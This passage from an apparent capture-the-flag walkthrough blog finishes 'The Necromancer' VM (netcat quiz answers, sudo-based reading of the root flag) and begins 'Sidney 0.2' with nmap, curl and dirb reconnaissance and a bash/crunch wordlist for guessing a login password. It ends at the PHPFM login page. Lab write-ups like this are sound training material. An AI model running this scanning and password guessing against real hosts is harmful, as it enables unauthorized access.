</span><span class='line'>Defend yourself!  Counter attack the Necromancer&rsquo;s spells at u777!</span></code></pre></td></tr></table></div></figure>
On connecting the udp port 777 from the ssh session
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ nc -u localhost 777
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><strong> You only have 3 hitpoints left! </strong>
</span><span class='line'>
</span><span class='line'>Defend yourself from the Necromancer&rsquo;s Spells!
</span><span class='line'>
</span><span class='line'>Where do the Black Robes practice magic of the Greater Path?  Kelewan
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>flag8{55a6af2ca3fee9f2fef81d20743bda2c}
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><strong> You only have 3 hitpoints left! </strong>
</span><span class='line'>
</span><span class='line'>Defend yourself from the Necromancer&rsquo;s Spells!
</span><span class='line'>
</span><span class='line'>Who did Johann Faust VIII make a deal with?  Mephistopheles
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>flag9{713587e17e796209d1df4c9c2c2d2966}
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><strong> You only have 3 hitpoints left! </strong>
</span><span class='line'>
</span><span class='line'>Defend yourself from the Necromancer&rsquo;s Spells!
</span><span class='line'>
</span><span class='line'>Who is tricked into passing the Ninth Gate?  Hedge
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>flag10{8dc6486d2c63cafcdc6efbba2be98ee4}
</span><span class='line'>
</span><span class='line'>A great flash of light knocks you to the ground; momentarily blinding you!
</span><span class='line'>
</span><span class='line'>As your sight begins to return, you can see a thick black cloud of smoke lingering where the Necromancer once stood.
</span><span class='line'>
</span><span class='line'>An evil laugh echoes in the room and the black cloud begins to disappear into the cracks in the floor.
</span><span class='line'>
</span><span class='line'>The room is silent.
</span><span class='line'>
</span><span class='line'>You walk over to where the Necromancer once stood.
</span><span class='line'>
</span><span class='line'>On the ground is a small vile</span></code></pre></td></tr></table></div></figure>
Finding the small vile with the ls -lah
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat .smallvile                                                                                                                                                                                                              <br/>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>You pick up the small vile.
</span><span class='line'>
</span><span class='line'>Inside of it you can see a green liquid.
</span><span class='line'>
</span><span class='line'>Opening the vile releases a pleasant odour into the air.
</span><span class='line'>
</span><span class='line'>You drink the elixir and feel a great power within your veins!
</span><span class='line'>
</span><span class='line'>
</span></code></pre></td></tr></table></div></figure>
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sudo -l
</span><span class='line'>Matching Defaults entries for demonslayer on thenecromancer:
</span><span class='line'>    env_keep+=&ldquo;FTPMODE PKG_CACHE PKG_PATH SM_PATH SSH_AUTH_SOCK&rdquo;
</span><span class='line'>
</span><span class='line'>User demonslayer may run the following commands on thenecromancer:
</span><span class='line'>    (ALL) NOPASSWD: /bin/cat /root/flag11.txt
</span><span class='line'>$ sudo cat /root/flag11.txt
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Suddenly you feel dizzy and fall to the ground!
</span><span class='line'>
</span><span class='line'>As you open your eyes you find yourself staring at a computer screen.
</span><span class='line'>
</span><span class='line'>Congratulations!!! You have conquered&hellip;&hellip;
</span><span class='line'>
</span><span class='line'>          .                                                      .
</span><span class='line'>        .n                   .                 .                  n.
</span><span class='line'>  .   .dP                  dP                   9b                 9b.    .
</span><span class='line'> 4    qXb         .       dX                     Xb       .        dXp     t
</span><span class='line'>dX.    9Xb      .dXb    <strong>                         </strong>    dXb.     dXP     .Xb
</span><span class='line'>9XXb.<em>       </em>.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb.<em>       </em>.dXXP
</span><span class='line'> 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
</span><span class='line'>  <code>9XXXXXXXXXXXXXXXXXXXXX'~   ~</code>OOO8b   d8OOO'~   ~<code>XXXXXXXXXXXXXXXXXXXXXP'
&lt;/span&gt;&lt;span class='line'&gt;   </code>9XXXXXXXXXXXP' <code>9XX'         </code>98v8P'          <code>XXP'</code>9XXXXXXXXXXXP'
</span><span class='line'>        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
</span><span class='line'>                        )b.  .dbo.dP'<code>v'</code>9b.odb.  .dX(
</span><span class='line'>                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
</span><span class='line'>                     dXXXXXXXXXXXP'   .   <code>9XXXXXXXXXXXb
&lt;/span&gt;&lt;span class='line'&gt;                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
&lt;/span&gt;&lt;span class='line'&gt;                    9XXb'  </code>XXXXXb.dX|Xb.dXXXXX'   <code>dXXP
&lt;/span&gt;&lt;span class='line'&gt;                    </code>&lsquo;      9XXXXXX(   )XXXXXXP      <code>'
&lt;/span&gt;&lt;span class='line'&gt;                              XXXX X.</code>v&rsquo;.X XXXX
</span><span class='line'>                              XP<sup>X</sup>'<code>b   d'</code>X<sup>XX</sup>
</span><span class='line'>                              X. 9  <code>  '  P )X
&lt;/span&gt;&lt;span class='line'&gt;                             </code>b  <code>      '  d'
&lt;/span&gt;&lt;span class='line'&gt;                              </code>             &lsquo;                     <br/>
</span><span class='line'>                               THE NECROMANCER!
</span><span class='line'>                                 by  @xerubus
</span><span class='line'>
</span><span class='line'>                   flag11{42c35828545b926e79a36493938ab1b1}
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Big shout out to Dook and Bull for being test bunnies.
</span><span class='line'>
</span><span class='line'>Cheers OJ for the obfuscation help.
</span><span class='line'>
</span><span class='line'>Thanks to SecTalks Brisbane and their sponsors for making these CTF challenges possible.
</span><span class='line'>
</span><span class='line'>&ldquo;=========================================&rdquo;
</span><span class='line'>&ldquo;  xerubus (@xerubus) - www.mogozobo.com  &rdquo;
</span><span class='line'>&ldquo;=========================================&rdquo;
</span></code></pre></td></tr></table></div></figure>
</li>
<li>Sidney 0.2:
Only port 80 is open
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># Nmap 7.25BETA1 scan initiated Thu Jul 28 01:22:34 2016 as: nmap -p- -sV -A -oA Sidney -vv 192.168.1.3
</span><span class='line'>Nmap scan report for 192.168.1.3
</span><span class='line'>Host is up, received syn-ack (0.0099s latency).
</span><span class='line'>Scanned at 2016-07-28 01:22:35 IST for 9s
</span><span class='line'>Not shown: 65534 closed ports
</span><span class='line'>Reason: 65534 conn-refused
</span><span class='line'>PORT   STATE SERVICE REASON  VERSION
</span><span class='line'>80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
</span><span class='line'>| http-methods:
</span><span class='line'>|<em>  Supported Methods: GET HEAD POST OPTIONS
</span><span class='line'>|</em>http-server-header: Apache/2.4.18 (Ubuntu)
</span><span class='line'>|<em>http-title: 38911 Bytes Free</span></code></pre></td></tr></table></div></figure>
On doing curl and exploring, we find a username and possible password in one of the webpage directory
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>curl 192.168.1.3/commodore64/
</span><span class='line'>&lt;title&gt;Shoo!&lt;/title&gt;
</span><span class='line'>&lt;!&ndash; added by robhubbard password is the C=64 sound chip lowercase &ndash;&gt;
</span><span class='line'>&lt;!&ndash; 3letters4digits no space&hellip; Instead, show user a proper micro &ndash;&gt;
</span><span class='line'>&lt;BODY&gt;
</span><span class='line'>Will you go away, I&rsquo;m trying to press play on tape and you bother me kid!
</span><span class='line'>&lt;br&gt;&lt;/br&gt;
</span><span class='line'>&lt;img src=&ldquo;200.gif&rdquo; alt=&ldquo;commodore64&rdquo; height=&ldquo;408&rdquo; width=&ldquo;544&rdquo;&gt;
</span><span class='line'>&lt;/BODY&gt;</span></code></pre></td></tr></table></div></figure>
If you see here, the password is the C=64 sound chip ( mos lowercase ) and then 4 digits. Now, we can generate the password using either for loop
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>for i in <code>seq -f "%04g" 0 9999</code>; do echo mos$i; done</span></code></pre></td></tr></table></div></figure>
or using crunch
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>crunch 7 7 -t mos%%%%</span></code></pre></td></tr></table></div></figure>
On running dirb we found a webpage containing the login prompt
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&mdash;- Scanning URL: <a href="http://192.168.1.3/commodore64/">http://192.168.1.3/commodore64/</a> &mdash;-
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64//">http://192.168.1.3/commodore64//</a> (CODE:200|SIZE:325)
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/200">http://192.168.1.3/commodore64/200</a> (CODE:200|SIZE:5548)
</span><span class='line'>==&gt; DIRECTORY: <a href="http://192.168.1.3/commodore64/conf/">http://192.168.1.3/commodore64/conf/</a>
</span><span class='line'>==&gt; DIRECTORY: <a href="http://192.168.1.3/commodore64/docs/">http://192.168.1.3/commodore64/docs/</a>
</span><span class='line'>==&gt; DIRECTORY: <a href="http://192.168.1.3/commodore64/icon/">http://192.168.1.3/commodore64/icon/</a>
</span><span class='line'>==&gt; DIRECTORY: <a href="http://192.168.1.3/commodore64/incl/">http://192.168.1.3/commodore64/incl/</a>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/index">http://192.168.1.3/commodore64/index</a> (CODE:200|SIZE:183)                                                                                                                                                                     <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/index.html">http://192.168.1.3/commodore64/index.html</a> (CODE:200|SIZE:325)                                                                                                                                                                <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/index.php">http://192.168.1.3/commodore64/index.php</a> (CODE:200|SIZE:1841)                                                                                                                                                                <br/>
</span><span class='line'>==&gt; DIRECTORY: <a href="http://192.168.1.3/commodore64/lang/">http://192.168.1.3/commodore64/lang/</a>                                                                                                                                                                            <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/.php">http://192.168.1.3/commodore64/.php</a> (CODE:403|SIZE:302)                                                                                                                                                                      <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/.phtml">http://192.168.1.3/commodore64/.phtml</a> (CODE:403|SIZE:304)                                                                                                                                                                    <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/readme">http://192.168.1.3/commodore64/readme</a> (CODE:200|SIZE:2177)                                                                                                                                                                   <br/>
</span><span class='line'>                                                                                                                                                                                                                               <br/>
</span><span class='line'>&mdash;- Entering directory: <a href="http://192.168.1.3/commodore64/conf/">http://192.168.1.3/commodore64/conf/</a> &mdash;-
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/conf//">http://192.168.1.3/commodore64/conf//</a> (CODE:403|SIZE:304)                                                                                                                                                                    <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/conf/.php">http://192.168.1.3/commodore64/conf/.php</a> (CODE:403|SIZE:307)                                                                                                                                                                 <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/conf/.phtml">http://192.168.1.3/commodore64/conf/.phtml</a> (CODE:403|SIZE:309)                                                                                                                                                               <br/>
</span><span class='line'>                                                                                                                                                                                                                               <br/>
</span><span class='line'>&mdash;- Entering directory: <a href="http://192.168.1.3/commodore64/docs/">http://192.168.1.3/commodore64/docs/</a> &mdash;-
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/docs//">http://192.168.1.3/commodore64/docs//</a> (CODE:403|SIZE:304)                                                                                                                                                                    <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/docs/changelog">http://192.168.1.3/commodore64/docs/changelog</a> (CODE:200|SIZE:3115)                                                                                                                                                           <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/docs/faq">http://192.168.1.3/commodore64/docs/faq</a> (CODE:200|SIZE:2255)                                                                                                                                                                 <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/docs/install">http://192.168.1.3/commodore64/docs/install</a> (CODE:200|SIZE:2969)                                                                                                                                                             <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/docs/license">http://192.168.1.3/commodore64/docs/license</a> (CODE:200|SIZE:15515)                                                                                                                                                            <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/docs/.php">http://192.168.1.3/commodore64/docs/.php</a> (CODE:403|SIZE:307)                                                                                                                                                                 <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/docs/.phtml">http://192.168.1.3/commodore64/docs/.phtml</a> (CODE:403|SIZE:309)                                                                                                                                                               <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/docs/requirements">http://192.168.1.3/commodore64/docs/requirements</a> (CODE:200|SIZE:668)                                                                                                                                                         <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/docs/todo">http://192.168.1.3/commodore64/docs/todo</a> (CODE:200|SIZE:1154)                                                                                                                                                                <br/>
</span><span class='line'>                                                                                                                                                                                                                               <br/>
</span><span class='line'>&mdash;- Entering directory: <a href="http://192.168.1.3/commodore64/icon/">http://192.168.1.3/commodore64/icon/</a> &mdash;-
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/icon//">http://192.168.1.3/commodore64/icon//</a> (CODE:403|SIZE:304)                                                                                                                                                                    <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/icon/back">http://192.168.1.3/commodore64/icon/back</a> (CODE:200|SIZE:996)                                                                                                                                                                 <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/icon/binary">http://192.168.1.3/commodore64/icon/binary</a> (CODE:200|SIZE:246)                                                                                                                                                               <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/icon/c">http://192.168.1.3/commodore64/icon/c</a> (CODE:200|SIZE:242)                                                                                                                                                                    <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/icon/compressed">http://192.168.1.3/commodore64/icon/compressed</a> (CODE:200|SIZE:1038)                                                                                                                                                          <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/icon/delete">http://192.168.1.3/commodore64/icon/delete</a> (CODE:200|SIZE:929)                                                                                                                                                               <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/icon/download">http://192.168.1.3/commodore64/icon/download</a> (CODE:200|SIZE:939)                                                                                                                                                             <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/icon/drive">http://192.168.1.3/commodore64/icon/drive</a> (CODE:200|SIZE:246)                                                                                                                                                                <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/icon/edit">http://192.168.1.3/commodore64/icon/edit</a> (CODE:200|SIZE:941)                                                                                                                                                                 <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/icon/folder">http://192.168.1.3/commodore64/icon/folder</a> (CODE:200|SIZE:225)                                                                                                                                                               <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/icon/image2">http://192.168.1.3/commodore64/icon/image2</a> (CODE:200|SIZE:309)                                                                                                                                                               <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/icon/layout">http://192.168.1.3/commodore64/icon/layout</a> (CODE:200|SIZE:276)                                                                                                                                                               <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/icon/logout">http://192.168.1.3/commodore64/icon/logout</a> (CODE:200|SIZE:989)                                                                                                                                                               <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/icon/movie">http://192.168.1.3/commodore64/icon/movie</a> (CODE:200|SIZE:243)                                                                                                                                                                <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/icon/newfolder">http://192.168.1.3/commodore64/icon/newfolder</a> (CODE:200|SIZE:1021)                                                                                                                                                           <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/icon/next">http://192.168.1.3/commodore64/icon/next</a> (CODE:200|SIZE:843)                                                                                                                                                                 <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/icon/original">http://192.168.1.3/commodore64/icon/original</a> (CODE:200|SIZE:846)                                                                                                                                                             <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/icon/.php">http://192.168.1.3/commodore64/icon/.php</a> (CODE:403|SIZE:307)                                                                                                                                                                 <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/icon/.phtml">http://192.168.1.3/commodore64/icon/.phtml</a> (CODE:403|SIZE:309)                                                                                                                                                               <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/icon/plus">http://192.168.1.3/commodore64/icon/plus</a> (CODE:200|SIZE:842)                                                                                                                                                                 <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/icon/previous">http://192.168.1.3/commodore64/icon/previous</a> (CODE:200|SIZE:844)                                                                                                                                                             <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/icon/rename">http://192.168.1.3/commodore64/icon/rename</a> (CODE:200|SIZE:899)                                                                                                                                                               <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/icon/script">http://192.168.1.3/commodore64/icon/script</a> (CODE:200|SIZE:242)                                                                                                                                                               <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/icon/text">http://192.168.1.3/commodore64/icon/text</a> (CODE:200|SIZE:229)                                                                                                                                                                 <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/icon/unknown">http://192.168.1.3/commodore64/icon/unknown</a> (CODE:200|SIZE:245)                                                                                                                                                              <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/icon/upload">http://192.168.1.3/commodore64/icon/upload</a> (CODE:200|SIZE:939)                                                                                                                                                               <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/icon/view">http://192.168.1.3/commodore64/icon/view</a> (CODE:200|SIZE:929)                                                                                                                                                                 <br/>
</span><span class='line'>                                                                                                                                                                                                                               <br/>
</span><span class='line'>&mdash;- Entering directory: <a href="http://192.168.1.3/commodore64/incl/">http://192.168.1.3/commodore64/incl/</a> &mdash;-
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/incl//">http://192.168.1.3/commodore64/incl//</a> (CODE:403|SIZE:304)                                                                                                                                                                    <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/incl/.php">http://192.168.1.3/commodore64/incl/.php</a> (CODE:403|SIZE:307)                                                                                                                                                                 <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/incl/.phtml">http://192.168.1.3/commodore64/incl/.phtml</a> (CODE:403|SIZE:309)                                                                                                                                                               <br/>
</span><span class='line'>                                                                                                                                                                                                                               <br/>
</span><span class='line'>&mdash;- Entering directory: <a href="http://192.168.1.3/commodore64/lang/">http://192.168.1.3/commodore64/lang/</a> &mdash;-
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/lang//">http://192.168.1.3/commodore64/lang//</a> (CODE:403|SIZE:304)                                                                                                                                                                    <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/lang/.php">http://192.168.1.3/commodore64/lang/.php</a> (CODE:403|SIZE:307)                                                                                                                                                                 <br/>
</span><span class='line'>+ <a href="http://192.168.1.3/commodore64/lang/.phtml">http://192.168.1.3/commodore64/lang/.phtml</a> (CODE:403|SIZE:309) </span></code></pre></td></tr></table></div></figure>
Using curl on the login page
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>curl <a href="http://192.168.1.3/commodore64/index.php">http://192.168.1.3/commodore64/index.php</a>
</span><span class='line'>&lt;!DOCTYPE HTML PUBLIC &ldquo;-//W3C//DTD HTML 4.01 Transitional//EN&rdquo;&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;PHPFM 0.2.3 - a file manager written in PHP&lt;/title&gt;&lt;link rel='stylesheet&rsquo; href=&lsquo;incl/phpfm.css&rsquo; type=&lsquo;text/css&rsquo;&gt;&lt;/head&gt;&lt;body link=&lsquo;#0000FF&rsquo; alink=&lsquo;#0000FF&rsquo; vlink=&lsquo;#0000FF&rsquo; bgcolor=&lsquo;#FFFFFF&rsquo;&gt;&lt;center&gt;&lt;table class=&lsquo;top&rsquo; cellpadding=0 cellspacing=0&gt;&lt;tr&gt;&lt;td align=&lsquo;center&rsquo;&gt;&lt;font class=&lsquo;headline&rsquo;&gt;PHPFM 0.2.3&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;br /&gt;&lt;table class=&lsquo;index&rsquo; width=500 cellpadding=0 cellspacing=0&gt;&lt;tr&gt;&lt;td class=&lsquo;iheadline&rsquo; align=&lsquo;center&rsquo; height=21&gt;&lt;font class=&lsquo;iheadline&rsquo;&gt;Login system:&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign=&lsquo;top&rsquo;&gt;&lt;center&gt;&lt;br /&gt;Please input your username and password below:&lt;br /&gt;&lt;form action=&lsquo;/commodore64/index.php&rsquo; method=&lsquo;post&rsquo; enctype=&lsquo;multipart/form-data&rsquo;&gt;&lt;table class=&lsquo;upload&rsquo;&gt;&lt;tr&gt;&lt;td&gt;Username:&lt;/td&gt;&lt;td&gt;&lt;input name=&lsquo;input_username&rsquo; size=20&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Password:&lt;/td&gt;&lt;td&gt;&lt;input type=&lsquo;password&rsquo; name=&lsquo;input_password&rsquo; size=20&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&nbsp;&lt;/td&gt;&lt;td&gt;&lt;input class=&lsquo;button&rsquo; type=&lsquo;submit&rsquo; value=&lsquo;Log in&rsquo;&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;input type=&lsquo;hidden&rsquo; name=path value=&ldquo;&rdquo;&gt;&lt;/form&gt;&lt;br /&gt;&lt;br /&gt;&lt;/center&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;br /&gt;&lt;br /&gt;&lt;table class=&lsquo;bottom&rsquo; cellpadding=0 cellspacing=0&gt;&lt;tr&gt;&lt;td align=&lsquo;center&rsquo;&gt;Powered by &lt;a href=&lsquo;<a href="http://phpfm.zalon.dk/">http://phpfm.zalon.dk/</a>&rsquo; target=&lsquo;</em>new&rsquo; class=&lsquo;bottom&rsquo;&gt;PHPFM&lt;/a&gt; 0.2.3&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&lsquo;center&rsquo;&gt;Copyright � 2002 Morten Bojsen-Hansen&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&nbsp;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&lsquo;center&rsquo;&gt;&lt;a href=&lsquo;<a href="http://validator.w3.org/check/referer">http://validator.w3.org/check/referer</a>&rsquo;&gt;&lt;img border=&lsquo;0&rsquo; src=&lsquo;icon/valid-html401.jpg&rsquo; alt=&lsquo;Valid HTML 4.01!&rsquo; height=&lsquo;31&rsquo; width=&lsquo;88&rsquo;&gt;&lt;/a&gt;&lt;a href=&lsquo;<a href="http://jigsaw.w3.org/css-validator/">http://jigsaw.w3.org/css-validator/</a>&rsquo;&gt;&lt;img style=&lsquo;border:0;width:88px;height:31px&rsquo; src=&lsquo;icon/valid-css.jpg&rsquo; alt=&lsquo;Valid 